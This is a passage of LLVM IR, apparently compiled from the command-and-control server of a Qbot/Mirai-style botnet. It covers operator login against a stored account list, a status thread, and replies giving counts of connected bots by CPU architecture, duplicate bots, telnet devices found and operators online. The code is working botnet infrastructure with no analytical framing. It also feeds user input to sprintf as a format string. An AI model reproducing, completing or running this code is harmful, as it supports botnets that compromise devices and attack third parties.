  %87 = icmp ne i32 %86, 0
  %88 = xor i1 %87, true
  br i1 %88, label %89, label %94

89:                                               ; preds = %84
  %90 = load %struct._IO_FILE*, %struct._IO_FILE** %24, align 8
  %91 = call i32 @fgetc(%struct._IO_FILE* %90)
  store i32 %91, i32* %26, align 4
  %92 = load i32, i32* %25, align 4
  %93 = add nsw i32 %92, 1
  store i32 %93, i32* %25, align 4
  br label %84, !llvm.loop !24

94:                                               ; preds = %84
  store i32 0, i32* %27, align 4
  %95 = load %struct._IO_FILE*, %struct._IO_FILE** %24, align 8
  call void @rewind(%struct._IO_FILE* %95)
  br label %96

96:                                               ; preds = %101, %94
  %97 = load i32, i32* %27, align 4
  %98 = load i32, i32* %25, align 4
  %99 = sub nsw i32 %98, 1
  %100 = icmp ne i32 %97, %99
  br i1 %100, label %101, label %116

101:                                              ; preds = %96
  %102 = load %struct._IO_FILE*, %struct._IO_FILE** %24, align 8
  %103 = load i32, i32* %27, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %104
  %106 = getelementptr inbounds %struct.login_info, %struct.login_info* %105, i32 0, i32 0
  %107 = getelementptr inbounds [20 x i8], [20 x i8]* %106, i64 0, i64 0
  %108 = load i32, i32* %27, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %109
  %111 = getelementptr inbounds %struct.login_info, %struct.login_info* %110, i32 0, i32 1
  %112 = getelementptr inbounds [20 x i8], [20 x i8]* %111, i64 0, i64 0
  %113 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %102, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.33, i64 0, i64 0), i8* %107, i8* %112)
  %114 = load i32, i32* %27, align 4
  %115 = add nsw i32 %114, 1
  store i32 %115, i32* %27, align 4
  br label %96, !llvm.loop !25

116:                                              ; preds = %96
  %117 = load i32, i32* %5, align 4
  %118 = call i64 @send(i32 %117, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.34, i64 0, i64 0), i64 16, i32 16384)
  %119 = icmp eq i64 %118, -1
  br i1 %119, label %120, label %121

120:                                              ; preds = %116
  br label %1336

121:                                              ; preds = %116
  %122 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %123 = load i32, i32* %5, align 4
  %124 = call i32 @fdgets(i8* %122, i32 2048, i32 %123)
  %125 = icmp slt i32 %124, 1
  br i1 %125, label %126, label %127

126:                                              ; preds = %121
  br label %1336

127:                                              ; preds = %121
  %128 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @trim(i8* %128)
  %129 = getelementptr inbounds [80 x i8], [80 x i8]* %4, i64 0, i64 0
  %130 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %131 = call i32 (i8*, i8*, ...) @sprintf(i8* %129, i8* %130) #9
  %132 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  store i8* %132, i8** %10, align 8
  %133 = load i8*, i8** %10, align 8
  %134 = call i32 @Search_in_File(i8* %133)
  store i32 %134, i32* %6, align 4
  %135 = load i8*, i8** %10, align 8
  %136 = load i32, i32* %6, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %137
  %139 = getelementptr inbounds %struct.login_info, %struct.login_info* %138, i32 0, i32 0
  %140 = getelementptr inbounds [20 x i8], [20 x i8]* %139, i64 0, i64 0
  %141 = call i32 @strcmp(i8* %135, i8* %140) #8
  %142 = icmp eq i32 %141, 0
  br i1 %142, label %143, label %167

143:                                              ; preds = %127
  %144 = load i32, i32* %5, align 4
  %145 = call i64 @send(i32 %144, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.36, i64 0, i64 0), i64 20, i32 16384)
  %146 = icmp eq i64 %145, -1
  br i1 %146, label %147, label %148

147:                                              ; preds = %143
  br label %1336

148:                                              ; preds = %143
  %149 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %150 = load i32, i32* %5, align 4
  %151 = call i32 @fdgets(i8* %149, i32 2048, i32 %150)
  %152 = icmp slt i32 %151, 1
  br i1 %152, label %153, label %154

153:                                              ; preds = %148
  br label %1336

154:                                              ; preds = %148
  %155 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @trim(i8* %155)
  %156 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %157 = load i32, i32* %6, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %158
  %160 = getelementptr inbounds %struct.login_info, %struct.login_info* %159, i32 0, i32 1
  %161 = getelementptr inbounds [20 x i8], [20 x i8]* %160, i64 0, i64 0
  %162 = call i32 @strcmp(i8* %156, i8* %161) #8
  %163 = icmp ne i32 %162, 0
  br i1 %163, label %164, label %165

164:                                              ; preds = %154
  br label %168

165:                                              ; preds = %154
  %166 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %166, i8 0, i64 2048, i1 false)
  br label %195

167:                                              ; preds = %127
  br label %168

168:                                              ; preds = %167, %164
  %169 = load i32, i32* %5, align 4
  %170 = call i64 @send(i32 %169, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.37, i64 0, i64 0), i64 6, i32 16384)
  %171 = icmp eq i64 %170, -1
  br i1 %171, label %172, label %173

172:                                              ; preds = %168
  br label %1336

173:                                              ; preds = %168
  %174 = load i32, i32* %5, align 4
  %175 = call i64 @send(i32 %174, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.38, i64 0, i64 0), i64 44, i32 16384)
  %176 = icmp eq i64 %175, -1
  br i1 %176, label %177, label %178

177:                                              ; preds = %173
  br label %1336

178:                                              ; preds = %173
  %179 = load i32, i32* %5, align 4
  %180 = call i64 @send(i32 %179, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.39, i64 0, i64 0), i64 44, i32 16384)
  %181 = icmp eq i64 %180, -1
  br i1 %181, label %182, label %183

182:                                              ; preds = %178
  br label %1336

183:                                              ; preds = %178
  %184 = load i32, i32* %5, align 4
  %185 = call i64 @send(i32 %184, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.40, i64 0, i64 0), i64 44, i32 16384)
  %186 = icmp eq i64 %185, -1
  br i1 %186, label %187, label %188

187:                                              ; preds = %183
  br label %1336

188:                                              ; preds = %183
  %189 = load i32, i32* %5, align 4
  %190 = call i64 @send(i32 %189, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.38, i64 0, i64 0), i64 43, i32 16384)
  %191 = icmp eq i64 %190, -1
  br i1 %191, label %192, label %193

192:                                              ; preds = %188
  br label %1336

193:                                              ; preds = %188
  %194 = call i32 @sleep(i32 5)
  br label %1336

195:                                              ; preds = %165
  %196 = load i8*, i8** %3, align 8
  %197 = call i32 @pthread_create(i64* %7, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %196) #9
  %198 = getelementptr inbounds [80 x i8], [80 x i8]* %28, i64 0, i64 0
  %199 = call i32 (i8*, i8*, ...) @sprintf(i8* %198, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.41, i64 0, i64 0)) #9
  %200 = getelementptr inbounds [2048 x i8], [2048 x i8]* %34, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %200, i8 0, i64 2048, i1 false)
  %201 = load i32, i32* %5, align 4
  %202 = call i64 @send(i32 %201, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.42, i64 0, i64 0), i64 14, i32 16384)
  %203 = icmp eq i64 %202, -1
  br i1 %203, label %204, label %205

204:                                              ; preds = %195
  br label %1336

205:                                              ; preds = %195
  %206 = load i32, i32* %5, align 4
  %207 = getelementptr inbounds [80 x i8], [80 x i8]* %28, i64 0, i64 0
  %208 = getelementptr inbounds [80 x i8], [80 x i8]* %28, i64 0, i64 0
  %209 = call i64 @strlen(i8* %208) #8
  %210 = call i64 @send(i32 %206, i8* %207, i64 %209, i32 16384)
  %211 = icmp eq i64 %210, -1
  br i1 %211, label %212, label %213

212:                                              ; preds = %205
  br label %1336

213:                                              ; preds = %205
  %214 = call i32 @sleep(i32 2)
  br label %215

215:                                              ; preds = %213
  %216 = load i8*, i8** %3, align 8
  %217 = call i32 @pthread_create(i64* %7, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %216) #9
  %218 = getelementptr inbounds [999 x i8], [999 x i8]* %35, i64 0, i64 0
  %219 = call i32 (i8*, i8*, ...) @sprintf(i8* %218, i8* getelementptr inbounds ([169 x i8], [169 x i8]* @.str.43, i64 0, i64 0)) #9
  %220 = getelementptr inbounds [999 x i8], [999 x i8]* %36, i64 0, i64 0
  %221 = call i32 (i8*, i8*, ...) @sprintf(i8* %220, i8* getelementptr inbounds ([207 x i8], [207 x i8]* @.str.44, i64 0, i64 0)) #9
  %222 = getelementptr inbounds [999 x i8], [999 x i8]* %37, i64 0, i64 0
  %223 = call i32 (i8*, i8*, ...) @sprintf(i8* %222, i8* getelementptr inbounds ([207 x i8], [207 x i8]* @.str.45, i64 0, i64 0)) #9
  %224 = getelementptr inbounds [999 x i8], [999 x i8]* %38, i64 0, i64 0
  %225 = call i32 (i8*, i8*, ...) @sprintf(i8* %224, i8* getelementptr inbounds ([207 x i8], [207 x i8]* @.str.46, i64 0, i64 0)) #9
  %226 = getelementptr inbounds [999 x i8], [999 x i8]* %39, i64 0, i64 0
  %227 = call i32 (i8*, i8*, ...) @sprintf(i8* %226, i8* getelementptr inbounds ([177 x i8], [177 x i8]* @.str.47, i64 0, i64 0)) #9
  %228 = getelementptr inbounds [999 x i8], [999 x i8]* %40, i64 0, i64 0
  %229 = call i32 (i8*, i8*, ...) @sprintf(i8* %228, i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.48, i64 0, i64 0)) #9
  %230 = getelementptr inbounds [999 x i8], [999 x i8]* %41, i64 0, i64 0
  %231 = call i32 (i8*, i8*, ...) @sprintf(i8* %230, i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.49, i64 0, i64 0)) #9
  %232 = getelementptr inbounds [999 x i8], [999 x i8]* %42, i64 0, i64 0
  %233 = load i32, i32* %6, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %234
  %236 = getelementptr inbounds %struct.login_info, %struct.login_info* %235, i32 0, i32 0
  %237 = getelementptr inbounds [20 x i8], [20 x i8]* %236, i64 0, i64 0
  %238 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %239 = call i32 (i8*, i8*, ...) @sprintf(i8* %232, i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.50, i64 0, i64 0), i8* %237, i8* %238) #9
  %240 = getelementptr inbounds [999 x i8], [999 x i8]* %43, i64 0, i64 0
  %241 = call i32 (i8*, i8*, ...) @sprintf(i8* %240, i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.51, i64 0, i64 0)) #9
  %242 = getelementptr inbounds [999 x i8], [999 x i8]* %44, i64 0, i64 0
  %243 = call i32 (i8*, i8*, ...) @sprintf(i8* %242, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.52, i64 0, i64 0)) #9
  %244 = load i32, i32* %5, align 4
  %245 = call i64 @send(i32 %244, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.42, i64 0, i64 0), i64 14, i32 16384)
  %246 = icmp eq i64 %245, -1
  br i1 %246, label %247, label %248

247:                                              ; preds = %215
  br label %1336

248:                                              ; preds = %215
  %249 = load i32, i32* %5, align 4
  %250 = getelementptr inbounds [999 x i8], [999 x i8]* %35, i64 0, i64 0
  %251 = getelementptr inbounds [999 x i8], [999 x i8]* %35, i64 0, i64 0
  %252 = call i64 @strlen(i8* %251) #8
  %253 = call i64 @send(i32 %249, i8* %250, i64 %252, i32 16384)
  %254 = icmp eq i64 %253, -1
  br i1 %254, label %255, label %256

255:                                              ; preds = %248
  br label %1336

256:                                              ; preds = %248
  %257 = load i32, i32* %5, align 4
  %258 = getelementptr inbounds [999 x i8], [999 x i8]* %36, i64 0, i64 0
  %259 = getelementptr inbounds [999 x i8], [999 x i8]* %36, i64 0, i64 0
  %260 = call i64 @strlen(i8* %259) #8
  %261 = call i64 @send(i32 %257, i8* %258, i64 %260, i32 16384)
  %262 = icmp eq i64 %261, -1
  br i1 %262, label %263, label %264

263:                                              ; preds = %256
  br label %1336

264:                                              ; preds = %256
  %265 = load i32, i32* %5, align 4
  %266 = getelementptr inbounds [999 x i8], [999 x i8]* %37, i64 0, i64 0
  %267 = getelementptr inbounds [999 x i8], [999 x i8]* %37, i64 0, i64 0
  %268 = call i64 @strlen(i8* %267) #8
  %269 = call i64 @send(i32 %265, i8* %266, i64 %268, i32 16384)
  %270 = icmp eq i64 %269, -1
  br i1 %270, label %271, label %272

271:                                              ; preds = %264
  br label %1336

272:                                              ; preds = %264
  %273 = load i32, i32* %5, align 4
  %274 = getelementptr inbounds [999 x i8], [999 x i8]* %38, i64 0, i64 0
  %275 = getelementptr inbounds [999 x i8], [999 x i8]* %38, i64 0, i64 0
  %276 = call i64 @strlen(i8* %275) #8
  %277 = call i64 @send(i32 %273, i8* %274, i64 %276, i32 16384)
  %278 = icmp eq i64 %277, -1
  br i1 %278, label %279, label %280

279:                                              ; preds = %272
  br label %1336

280:                                              ; preds = %272
  %281 = load i32, i32* %5, align 4
  %282 = getelementptr inbounds [999 x i8], [999 x i8]* %39, i64 0, i64 0
  %283 = getelementptr inbounds [999 x i8], [999 x i8]* %39, i64 0, i64 0
  %284 = call i64 @strlen(i8* %283) #8
  %285 = call i64 @send(i32 %281, i8* %282, i64 %284, i32 16384)
  %286 = icmp eq i64 %285, -1
  br i1 %286, label %287, label %288

287:                                              ; preds = %280
  br label %1336

288:                                              ; preds = %280
  %289 = load i32, i32* %5, align 4
  %290 = getelementptr inbounds [999 x i8], [999 x i8]* %40, i64 0, i64 0
  %291 = getelementptr inbounds [999 x i8], [999 x i8]* %40, i64 0, i64 0
  %292 = call i64 @strlen(i8* %291) #8
  %293 = call i64 @send(i32 %289, i8* %290, i64 %292, i32 16384)
  %294 = icmp eq i64 %293, -1
  br i1 %294, label %295, label %296

295:                                              ; preds = %288
  br label %1336

296:                                              ; preds = %288
  %297 = load i32, i32* %5, align 4
  %298 = getelementptr inbounds [999 x i8], [999 x i8]* %41, i64 0, i64 0
  %299 = getelementptr inbounds [999 x i8], [999 x i8]* %41, i64 0, i64 0
  %300 = call i64 @strlen(i8* %299) #8
  %301 = call i64 @send(i32 %297, i8* %298, i64 %300, i32 16384)
  %302 = icmp eq i64 %301, -1
  br i1 %302, label %303, label %304

303:                                              ; preds = %296
  br label %1336

304:                                              ; preds = %296
  %305 = load i32, i32* %5, align 4
  %306 = getelementptr inbounds [999 x i8], [999 x i8]* %42, i64 0, i64 0
  %307 = getelementptr inbounds [999 x i8], [999 x i8]* %42, i64 0, i64 0
  %308 = call i64 @strlen(i8* %307) #8
  %309 = call i64 @send(i32 %305, i8* %306, i64 %308, i32 16384)
  %310 = icmp eq i64 %309, -1
  br i1 %310, label %311, label %312

311:                                              ; preds = %304
  br label %1336

312:                                              ; preds = %304
  %313 = load i32, i32* %5, align 4
  %314 = getelementptr inbounds [999 x i8], [999 x i8]* %43, i64 0, i64 0
  %315 = getelementptr inbounds [999 x i8], [999 x i8]* %43, i64 0, i64 0
  %316 = call i64 @strlen(i8* %315) #8
  %317 = call i64 @send(i32 %313, i8* %314, i64 %316, i32 16384)
  %318 = icmp eq i64 %317, -1
  br i1 %318, label %319, label %320

319:                                              ; preds = %312
  br label %1336

320:                                              ; preds = %312
  %321 = load i32, i32* %5, align 4
  %322 = getelementptr inbounds [999 x i8], [999 x i8]* %44, i64 0, i64 0
  %323 = getelementptr inbounds [999 x i8], [999 x i8]* %44, i64 0, i64 0
  %324 = call i64 @strlen(i8* %323) #8
  %325 = call i64 @send(i32 %321, i8* %322, i64 %324, i32 16384)
  %326 = icmp eq i64 %325, -1
  br i1 %326, label %327, label %328

327:                                              ; preds = %320
  br label %1336

328:                                              ; preds = %320
  br label %329

329:                                              ; preds = %328
  %330 = load i32, i32* %5, align 4
  %331 = call i64 @send(i32 %330, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.53, i64 0, i64 0), i64 13, i32 16384)
  %332 = icmp eq i64 %331, -1
  br i1 %332, label %333, label %334

333:                                              ; preds = %329
  br label %1336

334:                                              ; preds = %329
  br label %335

335:                                              ; preds = %334
  %336 = load i8*, i8** %3, align 8
  %337 = call i32 @pthread_create(i64* %7, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %336) #9
  %338 = load i32, i32* %5, align 4
  %339 = sext i32 %338 to i64
  %340 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %339
  %341 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %340, i32 0, i32 0
  store i32 1, i32* %341, align 4
  br label %342

342:                                              ; preds = %1312, %1311, %1057, %983, %889, %335
  %343 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %344 = load i32, i32* %5, align 4
  %345 = call i32 @fdgets(i8* %343, i32 2048, i32 %344)
  %346 = icmp sgt i32 %345, 0
  br i1 %346, label %347, label %1335

347:                                              ; preds = %342
  %348 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %349 = call i8* @strstr(i8* %348, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.54, i64 0, i64 0)) #8
  %350 = icmp ne i8* %349, null
  br i1 %350, label %351, label %429

351:                                              ; preds = %347
  %352 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %353 = call i32 @mips()
  %354 = call i32 (i8*, i8*, ...) @sprintf(i8* %352, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.55, i64 0, i64 0), i32 %353) #9
  %355 = getelementptr inbounds [2048 x i8], [2048 x i8]* %14, i64 0, i64 0
  %356 = call i32 @x86()
  %357 = call i32 (i8*, i8*, ...) @sprintf(i8* %355, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.56, i64 0, i64 0), i32 %356) #9
  %358 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %359 = call i32 @ppc()
  %360 = call i32 (i8*, i8*, ...) @sprintf(i8* %358, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.57, i64 0, i64 0), i32 %359) #9
  %361 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %362 = call i32 @m68k()
  %363 = call i32 (i8*, i8*, ...) @sprintf(i8* %361, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.58, i64 0, i64 0), i32 %362) #9
  %364 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %365 = call i32 @spc()
  %366 = call i32 (i8*, i8*, ...) @sprintf(i8* %364, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.59, i64 0, i64 0), i32 %365) #9
  %367 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i64 0, i64 0
  %368 = call i32 @arm()
  %369 = call i32 (i8*, i8*, ...) @sprintf(i8* %367, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.60, i64 0, i64 0), i32 %368) #9
  %370 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %371 = call i32 @sh4()
  %372 = call i32 (i8*, i8*, ...) @sprintf(i8* %370, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.61, i64 0, i64 0), i32 %371) #9
  %373 = load i32, i32* %5, align 4
  %374 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %375 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %376 = call i64 @strlen(i8* %375) #8
  %377 = call i64 @send(i32 %373, i8* %374, i64 %376, i32 16384)
  %378 = icmp eq i64 %377, -1
  br i1 %378, label %379, label %380

379:                                              ; preds = %351
  store i8* null, i8** %2, align 8
  br label %1345

380:                                              ; preds = %351
  %381 = load i32, i32* %5, align 4
  %382 = getelementptr inbounds [2048 x i8], [2048 x i8]* %14, i64 0, i64 0
  %383 = getelementptr inbounds [2048 x i8], [2048 x i8]* %14, i64 0, i64 0
  %384 = call i64 @strlen(i8* %383) #8
  %385 = call i64 @send(i32 %381, i8* %382, i64 %384, i32 16384)
  %386 = icmp eq i64 %385, -1
  br i1 %386, label %387, label %388

387:                                              ; preds = %380
  store i8* null, i8** %2, align 8
  br label %1345

388:                                              ; preds = %380
  %389 = load i32, i32* %5, align 4
  %390 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %391 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %392 = call i64 @strlen(i8* %391) #8
  %393 = call i64 @send(i32 %389, i8* %390, i64 %392, i32 16384)
  %394 = icmp eq i64 %393, -1
  br i1 %394, label %395, label %396

395:                                              ; preds = %388
  store i8* null, i8** %2, align 8
  br label %1345

396:                                              ; preds = %388
  %397 = load i32, i32* %5, align 4
  %398 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %399 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %400 = call i64 @strlen(i8* %399) #8
  %401 = call i64 @send(i32 %397, i8* %398, i64 %400, i32 16384)
  %402 = icmp eq i64 %401, -1
  br i1 %402, label %403, label %404

403:                                              ; preds = %396
  store i8* null, i8** %2, align 8
  br label %1345

404:                                              ; preds = %396
  %405 = load i32, i32* %5, align 4
  %406 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %407 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %408 = call i64 @strlen(i8* %407) #8
  %409 = call i64 @send(i32 %405, i8* %406, i64 %408, i32 16384)
  %410 = icmp eq i64 %409, -1
  br i1 %410, label %411, label %412

411:                                              ; preds = %404
  store i8* null, i8** %2, align 8
  br label %1345

412:                                              ; preds = %404
  %413 = load i32, i32* %5, align 4
  %414 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i64 0, i64 0
  %415 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i64 0, i64 0
  %416 = call i64 @strlen(i8* %415) #8
  %417 = call i64 @send(i32 %413, i8* %414, i64 %416, i32 16384)
  %418 = icmp eq i64 %417, -1
  br i1 %418, label %419, label %420

419:                                              ; preds = %412
  store i8* null, i8** %2, align 8
  br label %1345

420:                                              ; preds = %412
  %421 = load i32, i32* %5, align 4
  %422 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %423 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %424 = call i64 @strlen(i8* %423) #8
  %425 = call i64 @send(i32 %421, i8* %422, i64 %424, i32 16384)
  %426 = icmp eq i64 %425, -1
  br i1 %426, label %427, label %428

427:                                              ; preds = %420
  store i8* null, i8** %2, align 8
  br label %1345

428:                                              ; preds = %420
  br label %429

429:                                              ; preds = %428, %347
  %430 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %431 = call i8* @strstr(i8* %430, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.62, i64 0, i64 0)) #8
  %432 = icmp ne i8* %431, null
  br i1 %432, label %433, label %478

433:                                              ; preds = %429
  %434 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %435 = call i32 @BotsConnected()
  %436 = call i32 (i8*, i8*, ...) @sprintf(i8* %434, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.63, i64 0, i64 0), i32 %435) #9
  %437 = getelementptr inbounds [2048 x i8], [2048 x i8]* %14, i64 0, i64 0
  %438 = load volatile i32, i32* @dups, align 4
  %439 = call i32 (i8*, i8*, ...) @sprintf(i8* %437, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.64, i64 0, i64 0), i32 %438) #9
  %440 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %441 = load volatile i32, i32* @TELFound, align 4
  %442 = call i32 (i8*, i8*, ...) @sprintf(i8* %440, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.65, i64 0, i64 0), i32 %441) #9
  %443 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %444 = load volatile i32, i32* @OperatorsConnected, align 4
  %445 = call i32 (i8*, i8*, ...) @sprintf(i8* %443, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.66, i64 0, i64 0), i32 %444) #9
  %446 = load i32, i32* %5, align 4
  %447 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %448 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %449 = call i64 @strlen(i8* %448) #8
  %450 = call i64 @send(i32 %446, i8* %447, i64 %449, i32 16384)
  %451 = icmp eq i64 %450, -1
  br i1 %451, label %452, label %453

452:                                              ; preds = %433
  store i8* null, i8** %2, align 8
  br label %1345

453:                                              ; preds = %433
  %454 = load i32, i32* %5, align 4
  %455 = getelementptr inbounds [2048 x i8], [2048 x i8]* %14, i64 0, i64 0
  %456 = getelementptr inbounds [2048 x i8], [2048 x i8]* %14, i64 0, i64 0
  %457 = call i64 @strlen(i8* %456) #8
  %458 = call i64 @send(i32 %454, i8* %455, i64 %457, i32 16384)
  %459 = icmp eq i64 %458, -1
  br i1 %459, label %460, label %461

460:                                              ; preds = %453
  store i8* null, i8** %2, align 8
  br label %1345

461:                                              ; preds = %453
  %462 = load i32, i32* %5, align 4
  %463 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %464 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %465 = call i64 @strlen(i8* %464) #8
  %466 = call i64 @send(i32 %462, i8* %463, i64 %465, i32 16384)
  %467 = icmp eq i64 %466, -1
  br i1 %467, label %468, label %469

468:                                              ; preds = %461
  store i8* null, i8** %2, align 8
  br label %1345

469:                                              ; preds = %461
  %470 = load i32, i32* %5, align 4
  %471 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %472 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %473 = call i64 @strlen(i8* %472) #8
  %474 = call i64 @send(i32 %470, i8* %471, i64 %473, i32 16384)
  %475 = icmp eq i64 %474, -1
  br i1 %475, label %476, label %477

476:                                              ; preds = %469
  store i8* null, i8** %2, align 8
  br label %1345

477:                                              ; preds = %469
  br label %478

478:                                              ; preds = %477, %429
  %479 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %480 = call i8* @strstr(i8* %479, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.67, i64 0, i64 0)) #8
  %481 = icmp ne i8* %480, null
  br i1 %481, label %482, label %527

482:                                              ; preds = %478
  %483 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %484 = call i32 @BotsConnected()
  %485 = call i32 (i8*, i8*, ...) @sprintf(i8* %483, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.63, i64 0, i64 0), i32 %484) #9
  %486 = getelementptr inbounds [2048 x i8], [2048 x i8]* %14, i64 0, i64 0
  %487 = load volatile i32, i32* @dups, align 4
  %488 = call i32 (i8*, i8*, ...) @sprintf(i8* %486, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.64, i64 0, i64 0), i32 %487) #9
  %489 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %490 = load volatile i32, i32* @TELFound, align 4
  %491 = call i32 (i8*, i8*, ...) @sprintf(i8* %489, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.65, i64 0, i64 0), i32 %490) #9
  %492 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %493 = load volatile i32, i32* @OperatorsConnected, align 4
  %494 = call i32 (i8*, i8*, ...) @sprintf(i8* %492, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.66, i64 0, i64 0), i32 %493) #9
  %495 = load i32, i32* %5, align 4
  %496 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %497 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %498 = call i64 @strlen(i8* %497) #8
  %499 = call i64 @send(i32 %495, i8* %496, i64 %498, i32 16384)
  %500 = icmp eq i64 %499, -1
  br i1 %500, label %501, label %502

501:                                              ; preds = %482
  store i8* null, i8** %2, align 8
  br label %1345

502:                                              ; preds = %482
  %503 = load i32, i32* %5, align 4
  %504 = getelementptr inbounds [2048 x i8], [2048 x i8]* %14, i64 0, i64 0
  %505 = getelementptr inbounds [2048 x i8], [2048 x i8]* %14, i64 0, i64 0
  %506 = call i64 @strlen(i8* %505) #8
  %507 = call i64 @send(i32 %503, i8* %504, i64 %506, i32 16384)
  %508 = icmp eq i64 %507, -1
  br i1 %508, label %509, label %510

509:                                              ; preds = %502
  store i8* null, i8** %2, align 8
